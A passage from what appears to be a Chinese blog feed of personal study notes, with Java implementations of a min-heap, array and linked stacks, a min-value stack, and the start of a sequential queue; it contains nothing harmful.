j; <span class="comment">// 选择两孩子中较小的那个</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (temp &lt; heap[j]) &#123;   <span class="comment">// 较小的孩子大于父亲，不做任何处理</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    <span class="comment">// 否则，替换父节点的值</span></span><br><span class="line">heap[i] = heap[j];  </span><br><span class="line">i = j;</span><br><span class="line">j = <span class="number">2</span> * j + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">heap[i] = temp;  <span class="comment">// 一步到位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自下向上调整为最小堆(原来已是最小堆，添加元素后，确保其还是最小堆)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">shiftUp</span><span class="params">(<span class="type">int</span> start)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> start;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (j - <span class="number">1</span>) / <span class="number">2</span>;   <span class="comment">// 起始调整位置，分支节点</span></span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> heap[j];</span><br><span class="line"><span class="keyword">while</span> (j &gt; <span class="number">0</span>) &#123;      <span class="comment">// 迭代条件：子节点必须不为根</span></span><br><span class="line"><span class="keyword">if</span> (temp &gt;= heap[i]) &#123;  <span class="comment">//原已是最小堆，所以只需比较这个子女与父亲的关系即可</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">heap[j] = heap[i];</span><br><span class="line">j = i;</span><br><span class="line">i = (j - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">heap[j] = temp;   <span class="comment">// 一步到位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向最小堆插入元素(总是插入到最小堆的最后)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> data)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (size &lt; heap.length) &#123;</span><br><span class="line">heap[size++] = data;   <span class="comment">// 插入堆尾</span></span><br><span class="line">shiftUp(size-<span class="number">1</span>);   <span class="comment">// 自下而上调整</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 删除堆顶元素，以堆的最后一个元素填充</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">heap[<span class="number">0</span>] = heap[size-<span class="number">1</span>];   <span class="comment">// 删除堆顶元素，并将堆尾元素回填到堆顶</span></span><br><span class="line">size --;   <span class="comment">// 堆大小减一</span></span><br><span class="line">shiftDown(<span class="number">0</span>, size-<span class="number">1</span>);   <span class="comment">// 自上向下调整为最小堆</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 堆排序:每次将最小元素交换到最后</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> heap[<span class="number">0</span>];</span><br><span class="line">heap[<span class="number">0</span>] = heap[i];</span><br><span class="line">heap[i] = temp;</span><br><span class="line"></span><br><span class="line">shiftDown(<span class="number">0</span>, i-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size-<span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">System.out.print(heap[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印根为 i 的最小堆</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printMinHeap</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (size &gt; i) &#123;</span><br><span class="line">System.out.print(heap[i]);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">2</span> * i + <span class="number">1</span> &lt; size || <span class="number">2</span> * i + <span class="number">2</span> &lt; size) &#123;</span><br><span class="line">System.out.print(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">printMinHeap(<span class="number">2</span> * i + <span class="number">1</span>);</span><br><span class="line">System.out.print(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">printMinHeap(<span class="number">2</span> * i + <span class="number">2</span>);</span><br><span class="line">System.out.print(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人学习小结，其中可能有错误，还望在下方评论指出 &#x3D; V &#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈和队列 Stack and Queue</title>
    <link href="/2023/06/18/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%20Stack%20and%20Queue/"/>
    <url>/2023/06/18/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%20Stack%20and%20Queue/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>栈的特点为后进先出，队列的特点是先进先出，两者都是基本的数据结构，相似处比较多，就放在一起了。</p><h2 id="栈的Java实现"><a href="#栈的Java实现" class="headerlink" title="栈的Java实现"></a>栈的Java实现</h2><p>栈分为顺序栈和链式栈，顺序栈的底层是由数组实现，而链式栈的底层是由链表实现。顺序栈的空间连续，链式栈空间不连续。</p><h3 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeqStack</span>&lt;E&gt; &#123;</span><br><span class="line"><span class="keyword">private</span> Object[] stack;    <span class="comment">// 支撑数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> top;    <span class="comment">// 栈顶指针</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> maxSize;    <span class="comment">// 栈的最大容量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SeqStack</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">this</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以指定容量的构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SeqStack</span><span class="params">(<span class="type">int</span> maxSize)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.stack = <span class="keyword">new</span> <span class="title class_">Object</span>[maxSize];</span><br><span class="line"><span class="built_in">this</span>.top = -<span class="number">1</span>;</span><br><span class="line"><span class="built_in">this</span>.maxSize = maxSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> top == -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹出并删除栈顶元素</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">pop</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="keyword">if</span> (top == -<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;栈为空...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">E</span> <span class="variable">element</span> <span class="operator">=</span> (E)stack[top];</span><br><span class="line">stack[top --] = <span class="literal">null</span>;    <span class="comment">// 删除该元素</span></span><br><span class="line"><span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(E e)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="keyword">if</span> (top == maxSize -<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;栈已满...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">stack[++top] = e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> stack[top];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印栈</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> Arrays.toString(stack);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链式栈"><a href="#链式栈" class="headerlink" title="链式栈"></a>链式栈</h3><p>因为栈具有“后进先出”的特点，如果每次在链表的尾部进行插入和删除，就要遍历整个链表来找到尾节点。而在头部进行插入和删除时，只需根据头指针即可找到链表的首元素结点。而无需遍历链表。所以链式栈的出，入栈通过对链表进行头删和头插来实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedListStack</span>&lt;E&gt; &#123;</span><br><span class="line"><span class="comment">// 支撑List</span></span><br><span class="line"><span class="keyword">private</span> LinkedList&lt;E&gt; stack;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LinkedListStack</span><span class="params">()</span>&#123;</span><br><span class="line">stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;E&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压栈</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(E data)</span>&#123;</span><br><span class="line">stack.addFirst(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹栈</span></span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">pop</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="keyword">if</span>(stack.isEmpty())&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;栈为空...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> stack.pop();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> stack.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="利用最小栈求栈中最小元素"><a href="#利用最小栈求栈中最小元素" class="headerlink" title="利用最小栈求栈中最小元素"></a>利用最小栈求栈中最小元素</h4><p>通过额外的栈结构来保证用O(1)的时间复杂度求栈中的最小元素 (空间换取时间)<br>如果当前入栈的元素比原来栈中的最小值还小，则将其保存到最小值栈中；否则，不做任何操作。<br>如果当前出栈的元素正好是当前栈中的最小值，那么将最小值栈中的该最小值也一并弹出；否则，不做任何操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedStack</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Node&lt;E&gt; top; <span class="comment">// 栈顶元素</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> size; <span class="comment">// 链式栈的大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最小值栈    </span></span><br><span class="line"><span class="keyword">private</span> LinkedStack&lt;E&gt; min;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LinkedStack</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压栈</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(E data)</span> &#123;</span><br><span class="line">Node&lt;E&gt; node = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;E&gt;(data); </span><br><span class="line"><span class="comment">// 新加入的元素指向栈顶元素</span></span><br><span class="line">node.next = top;</span><br><span class="line">top = node;</span><br><span class="line">size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压栈操作,使用最小值栈</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(E data, Comparator&lt;? <span class="built_in">super</span> E&gt; c)</span> &#123;</span><br><span class="line">push(data);</span><br><span class="line"><span class="keyword">if</span>(min == <span class="literal">null</span>)&#123;</span><br><span class="line">min = <span class="keyword">new</span> <span class="title class_">LinkedStack</span>&lt;E&gt;();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(min.peek() == <span class="literal">null</span>)&#123;</span><br><span class="line">min.push(data);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(c.compare(<span class="built_in">this</span>.peek().data, min.peek().data) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">min.push(data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹栈</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node&lt;E&gt; node = top;</span><br><span class="line">top = top.next;</span><br><span class="line">node.next = <span class="literal">null</span>;</span><br><span class="line">size--;</span><br><span class="line"><span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹栈,使用最小值栈</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">pop</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; c)</span>&#123;</span><br><span class="line">Node&lt;E&gt; temp = <span class="built_in">this</span>.pop();</span><br><span class="line"><span class="keyword">if</span>(temp != <span class="literal">null</span> &amp;&amp; min.peek() != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(c.compare(temp.data, min.peek().data) == <span class="number">0</span>)&#123;</span><br><span class="line">min.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹出栈顶元素(不执行删除操作)</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">peek</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前栈中的最小值 </span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">min</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(min.peek() == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> min.peek();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印栈</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">Node&lt;E&gt; index = top;</span><br><span class="line"><span class="keyword">while</span> (index != <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.print(index.data + <span class="string">&quot; &quot;</span>);</span><br><span class="line">index = index.next;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回栈的大小</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> LinkedStack&lt;E&gt; <span class="title function_">getMin</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMin</span><span class="params">(LinkedStack&lt;E&gt; min)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.min = min;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">Node&lt;E&gt; index = top;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">while</span> (index != <span class="literal">null</span>) &#123;</span><br><span class="line">sb.append(index.data).append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">index = index.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="队列的Java实现"><a href="#队列的Java实现" class="headerlink" title="队列的Java实现"></a>队列的Java实现</h2><p>队列同样有两种实现方式：顺序存储和链式存储，这一块和栈基本一致</p><p>队列接口的offer(E e)方法在不违反容量限制的情况下可以立即将指定的元素插入此队列。此方法优于add()方法，因为在容器的容量已满时，此方法不会引发异常，因为它会返回false。</p><p>用法:<br>boolean offer(E e)<br>参数：此方法接受强制参数e，该参数是要插入队列中的元素。<br>返回：成功插入时此方法返回true，否则返回false。</p><h3 id="队列的顺序实现"><a href="#队列的顺序实现" class="headerlink" title="队列的顺序实现"></a>队列的顺序实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeqQueue</span>&lt;E&gt; &#123;</span><br><span class="line"><span class="comment">// 队列的存储结构         </span></span><br><span class="line"><span class="keyword">private</span> Object[] queue;         </span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> maxSize;    <span class="comment">// 最大容量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SeqQueue</span><span class="params">(<span class="type">int</span> maxSize)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.maxSize = maxSize;</span><br><span class="line">queue = <span class="keyword">new</span> <span class="title class_">Object</span>[maxSize];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素到队尾</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(E data)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!isFull())&#123;</span><br><span class="line">queue[size] = data;</span><br><span class="line">size ++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 删除队头并返回队头元素的值</span></span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!isEmpty()) &#123;</span><br><span class="line"><span class="type">E</span> <span class="variable">temp</span> <span class="operator">=</span> (E) queue[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size - <span class="number">1</span>; i++) &#123;</span><br><span class="line">queue[i] = queue[i+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">queue[size-<span class="number">1</span>] = <span class="literal">null</span>;</span><br><span class="line">size--;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回队头元素</span></span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">peek</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> (E) queue[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队列是否已满</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isFull</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> size == maxSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 队列是否为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队列的大小</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> 